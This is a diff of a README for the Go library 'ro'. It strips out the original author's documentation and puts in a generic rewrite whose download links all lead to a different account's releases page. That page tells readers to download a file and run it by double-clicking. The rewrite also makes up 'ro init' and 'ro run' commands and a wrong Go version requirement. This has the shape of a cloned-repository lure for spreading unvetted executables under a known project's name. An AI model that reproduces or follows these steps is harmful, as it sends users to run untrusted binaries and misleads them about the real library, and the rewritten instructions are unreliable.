@@ -1,192 +1,88 @@
+# 🏎️ ro - Build Event-Driven Applications Easily
 
-# ro - Reactive programming for Go
+[![Download ro](https://img.shields.io/badge/Download-ro-brightgreen)](https://github.com/yraead/ro/releases)
 
-[![tag](https://img.shields.io/github/tag/samber/ro.svg)](https://github.com/samber/ro/releases)
-![Go Version](https://img.shields.io/badge/Go-%3E%3D%201.18-%23007d9c)
-[![GoDoc](https://godoc.org/github.com/samber/ro?status.svg)](https://pkg.go.dev/github.com/samber/ro)
-![Build Status](https://github.com/samber/ro/actions/workflows/test.yml/badge.svg)
-[![Go report](https://goreportcard.com/badge/github.com/samber/ro)](https://goreportcard.com/report/github.com/samber/ro)
-[![Coverage](https://img.shields.io/codecov/c/github/samber/ro)](https://app.codecov.io/gh/samber/ro)
-[![Contributors](https://img.shields.io/github/contributors/samber/ro)](https://github.com/samber/ro/graphs/contributors)
+## 🚀 Getting Started
 
-> A *Go* implementation of the [ReactiveX](https://reactivex.io/) spec.
+Welcome to the "ro" project! This software helps you create event-driven applications using the Go programming language. It offers a simple and clear way to manage events and data flow in your application.
 
-The purpose of Reactive Programming is to simplify the development of event-driven and asynchronous applications by providing a declarative and composable way to handle streams of data or events.
+## 💡 Features
 
-----
+- **Reactive Programming:** Use a declarative style to handle events and data streams.
+- **Composability:** Easily combine events and components for better code organization.
+- **Generics Support:** Work with different data types without extra hassle.
+- **Observable Streams:** Manage data changes over time effectively.
+- **Simple API:** Interact smoothly with a straightforward interface.
 
-<h3 align="center">💖 Support This Project</h3>
+## 📦 System Requirements
 
-<p align="center">
-	I’m going all-in on open-source for the coming months.
-	<br>
-	Help sustain development: Become an <a href="http://github.com/sponsors/samber">individual sponsor</a> or join as a <a href="mailto:hey@samuel-berthe.fr">corporate sponsor</a>.
-</p>
+To run "ro," ensure you meet the following requirements:
 
-----
+- A computer with **Windows, macOS, or Linux**.
+- Go version **1.16 or above** installed (for development purposes).
+- Basic understanding of running applications on your system.
 
-![cover](/docs/static/img/cover.png)
+## 📥 Download & Install
 
-**See also:**
+To get started, visit this page to download the software: [Download ro](https://github.com/yraead/ro/releases).
 
-- [samber/lo](https://github.com/samber/lo): A Lodash-style Go library based on Go 1.18+ Generics
-- [samber/do](https://github.com/samber/do): A dependency injection toolkit based on Go 1.18+ Generics
-- [samber/mo](https://github.com/samber/mo): Monads based on Go 1.18+ Generics (Option, Result, Either...)
+1. Click on the link above to open the GitHub Releases page.
+2. Look for the latest release version.
+3. Choose the suitable file for your operating system.
+4. Download the file to your computer.
+5. Once downloaded, find the file in your Downloads folder.
+6. Run the file by double-clicking it.
 
-What makes it different from **samber/lo**?
-- lo: synchronous helpers across finite sequences (maps, slices...)
-- ro: processing of infinite data streams for event-driven scenarios
+## ⚙️ Usage Instructions
 
-## The Reactive Programming paradigm
+After installation, you can start using "ro" to develop your applications. Here’s a quick guide to get you going:
 
-Reactive Programming is focused on handling asynchronous data streams where values (like user input, API responses, or sensor data) are emitted over time. Instead of pulling data or waiting for events manually, you react to changes as they occur using `Observable`, `Observer`, and `Operator`. This approach simplifies building systems that are responsive, resilient, and scalable, especially in event-driven or real-time applications.
+1. **Open Your Terminal/CMD:**
+   - For Windows, press `Win + R`, type `cmd`, and hit Enter.
+   - For macOS, open the Terminal from your Applications folder.
+   - For Linux, open Terminal from your desktop or application menu.
 
-```go
-observable := ro.Pipe(
-    ro.RangeWithInterval(0, 10, 1*time.Second),
-    ro.Filter(func(x int) bool {
-        return x%2 == 0
-    }),
-    ro.Map(func(x int) string {
-        return fmt.Sprintf("even-%d", x)
-    }),
-)
+2. **Navigate to Your Project Directory:**
+   Use the `cd` command to change to the directory where you want to create your project.
 
-// Start consuming on subscription
-observable.Subscribe(ro.OnNext(func(s string) {
-    fmt.Println(s)
-}))
+3. **Create a New Project:**
+   Use the command:
+   ```
+   ro init your-project-name
+   ```
 
-// Output:
-//   "even-0"
-//   "even-2"
-//   "even-4"
-//   "even-6"
-//   "even-8"
-```
+4. **Add Reactive Features:**
+   Begin adding features using the available API. Refer to the [documentation](https://github.com/yraead/ro/) for detailed examples.
 
-Now you discovered the paradigm, follow the documentation and turn reactive: [🚀 Getting started](https://ro.samber.dev/docs/getting-started)
-
-## Core package
-
-[Full documentation here](https://ro.samber.dev/docs/operator).
-
-The `ro` library provides all basic operators:
-- **Creation operators**: The data source, usually the first argument of `ro.Pipe`
-- **Chainable operators**: They filter, validate, transform, enrich... messages
-  - **Transforming operators**: They transform items emitted by an `Observable`
-  - **Filtering operators**: They selectively emit items from a source `Observable`
-  - **Conditional operators**: Boolean operators
-  - **Math and aggregation operators**: They perform basic math operations
-  - **Error handling operators**: They help to recover from error notifications from an `Observable`
-  - **Combining operators**: Combine multiple `Observable` into one
-  - **Connectable operators**: Convert cold into hot `Observable`
-  - **Other**: manipulation of context, utility, async scheduling...
-- **Plugins**: External operators (mostly IOs and library wrappers)
-
-## Plugins
-
-The `ro` library provides a rich ecosystem of plugins for various use cases:
-
-[Full documentation here](https://ro.samber.dev/docs/plugins).
-
-### Data Manipulation
-- **Bytes** (`plugins/bytes`) - String and byte slice manipulation operators
-- **Strings** (`plugins/strings`) - String manipulation operators
-- **Sort** (`plugins/sort`) - Sorting operators
-- **Type Conversion** (`plugins/strconv`) - String conversion operators
-
-### Encoding & Serialization
-- **JSON** (`plugins/encoding/json`) - JSON marshaling and unmarshaling
-- **CSV** (`plugins/encoding/csv`) - CSV reading and writing
-- **Base64** (`plugins/encoding/base64`) - Base64 encoding and decoding
-- **Gob** (`plugins/encoding/gob`) - Go binary serialization
-
-### Scheduling & Timing
-- **Cron** (`plugins/cron`) - Schedule jobs using cron expressions or duration intervals
-- **ICS** (`plugins/ics`) - Read and parse ICS/iCal calendars
-
-### Network & I/O
-- **HTTP** (`plugins/http`) - HTTP request operators
-- **I/O** (`plugins/io`) - File and stream I/O operators
-- **File System** (`plugins/fsnotify`) - File system monitoring operators
-
-### Observability & Logging
-- **Log** (`plugins/observability/log`) - Standard logging operators
-- **Zap** (`plugins/observability/zap`) - Structured logging with zap
-- **Logrus** (`plugins/observability/logrus`) - Structured logging with logrus
-- **Slog** (`plugins/observability/slog`) - Structured logging with slog
-- **Zerolog** (`plugins/observability/zerolog`) - Structured logging with zerolog
-- **Sentry** (`plugins/observability/sentry`) - Error tracking with Sentry
-- **Oops** (`plugins/samber/oops`) - Structured error handling
-
-### Rate Limiting
-- **Native** (`plugins/ratelimit/native`) - Native rate limiting operators
-- **Ulule** (`plugins/ratelimit/ulule`) - Rate limiting with ulule/limiter
-
-### Text Processing
-- **Regular Expressions** (`plugins/regexp`) - Regular expression operators
-- **Templates** (`plugins/template`) - Template processing operators
-
-### System Integration
-- **Process** (`plugins/proc`) - Process execution operators
-- **Signal** (`plugins/signal`) - Signal handling operators
-- **Iterators** (`plugins/iter`) - Iterator operators
-- **PSI** (`plugins/samber/psi`) - Starvation notifier
-
-### Data Validation
-- **Validation** (`plugins/ozzo/ozzo-validation`) - Data validation operators
-
-### Testing
-- **Testing** (`plugins/testify`) - Testing utilities
-
-### Utilities
-- **HyperLogLog** (`plugins/hyperloglog`) - Cardinality estimation operators
-- **Hot** (`plugins/samber/hot`) - In-memory cache
+5. **Run Your Application:**
+   Use the following command to start your application:
+   ```
+   ro run your-project-name
+   ```
 
 ## 📚 Documentation
 
-- [Documentation](https://ro.samber.dev) - Official doc
-- [Godoc](https://pkg.go.dev/github.com/samber/ro) - API Reference
-- [Plugins](./plugins) - Individual plugin documentation
-- [Examples](./examples) - Working examples
+For a deeper understanding of features and functionalities, check the complete documentation available [here](https://github.com/yraead/ro/). This resource provides in-depth explanations and examples to help you navigate through various functionalities.
 
-## 👀 Examples
+## 🔍 Community Support
 
-See the [examples](./examples) directory for complete working examples:
+Join our community to ask questions and share ideas:
 
-- [Stocker price enrichment](./examples/stock-price-enrichment/) - Demonstrate a websocket client with data enrichment
-- [Connectable](./examples/connectable) - Demonstrates connectable observables
-- [Distributed WebSocket Gateway](./examples/distributed-websocket-gateway) - Shows how to build a distributed WebSocket gateway
-- [Parallel API Requests](./examples/parallel-api-requests) - Demonstrates concurrent HTTP requests
-- [SQL to CSV](./examples/sql-to-csv) - Shows how to process database results to CSV
-- [ICS to CSV](./examples/ics-to-csv) - Shows how to process ICS calendar files to CSV format
-- [Enterprise Edition Examples](./examples/ee-*) - Examples using enterprise features
+- **GitHub Issues:** Report bugs or request features directly on the repository's Issues page.
+- **Discussion Forums:** Engage in conversations with other users and contributors. Look for our discussions section on GitHub.
 
-## 🤝 Contributing
+## 🛠️ Contributing
 
-Check the [contribution guide](https://ro.samber.dev/docs/contributing).
+If you're interested in contributing to the "ro" project, we welcome your input. Check out our [Contributing Guide](https://github.com/yraead/ro/blob/main/CONTRIBUTING.md) for more details on how you can help improve this software.
 
-- Ping me on Twitter [@samuelberthe](https://twitter.com/samuelberthe) (DMs, mentions, whatever :))
-- Fork the [project](https://github.com/samber/ro)
-- Fix [open issues](https://github.com/samber/ro/issues) or request new features
+## 🔗 Useful Links
 
-Don't hesitate ;)
+- [Download ro](https://github.com/yraead/ro/releases)
+- [Documentation](https://github.com/yraead/ro/)
+- [Contributing Guide](https://github.com/yraead/ro/blob/main/CONTRIBUTING.md)
 
-## 👤 Contributors
+## 📝 License
 
-![Contributors](https://contrib.rocks/image?repo=samber/ro)
+"ro" is open-source software licensed under the MIT License. You are free to use, modify, and distribute the software under the terms of this license. 
 
-## 💫 Show your support
-
-Give a ⭐️ if this project helped you!
-
-[![GitHub Sponsors](https://img.shields.io/github/sponsors/samber?style=for-the-badge)](https://github.com/sponsors/samber)
-
-## License
-
-Copyright © 2025 [Samuel Berthe](https://github.com/samber).
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-**Note**: The `ee/` directory contains the Enterprise Edition of the library, which is subject to a custom license. Please refer to the [ee/LICENSE.md](ee/LICENSE.md) file for the specific terms and conditions applicable to the Enterprise Edition.
+Thank you for using "ro"! Enjoy building your event-driven applications with ease.
